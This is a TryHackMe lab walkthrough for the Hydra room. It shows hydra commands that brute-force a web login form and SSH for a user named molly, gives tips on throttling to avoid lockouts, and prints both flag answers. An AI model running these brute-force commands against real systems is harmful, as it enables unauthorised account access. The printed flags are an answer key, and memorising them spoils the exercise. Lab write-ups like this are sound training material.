# TryHackMe – Hydra Walkthrough

<div align='center'>
<img width="101" alt="Screenshot 2025-06-17 at 3 05 47 PM" src="https://github.com/user-attachments/assets/996e9b25-e067-4078-b44a-eb123dfe9a8c" />
</div>

> **Room**: [Hydra](https://tryhackme.com/room/hydra)  
> **Difficulty**: Easy  
> **Skills**: Brute Forcing, Web Login Forms, SSH  
> **Description**: A hands-on introduction to Hydra, brute-forcing a web login form and an SSH service to recover a user's credentials.

---

## Task 1: Brute-Force the Web Login

The target hosts a login page for a user named `molly`. Using Hydra's `http-post-form` module, we brute-force the password against `rockyou.txt`, matching on the page's failure string (`F=incorrect`):

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt <ip-address> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

**What is flag 1?**

```
THM{2673a7dd116de68e85c48ec0b1f2612e}
```

---

## Task 2: Brute-Force SSH

The same username is tried against SSH, again with `rockyou.txt`:

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt <ip-address> -t 4 ssh
```

Once Hydra recovers the password, log in and read the flag from molly's home directory:

```bash
ssh molly@<ip-address>
cat flag2.txt
```

**What is flag 2?**

```
THM{c8eeb0468febbadea859baeb33b2541b}
```

---

## Tools Used

- `nmap` – service enumeration
- `hydra` – brute-forcing the web login and SSH
- `ssh` – remote access once credentials were recovered

---

## Key Takeaways

- Hydra's `http-post-form` module needs the exact POST body and a string that reliably identifies a failed login (`F=` for a failure match, or `S=` for a success match).
- Reusing the same username across services (web login and SSH) is a common real-world misconfiguration worth checking for.
- Throttling SSH brute-force attempts (`-t 4`) avoids tripping lockouts or connection limits that a higher thread count can cause.
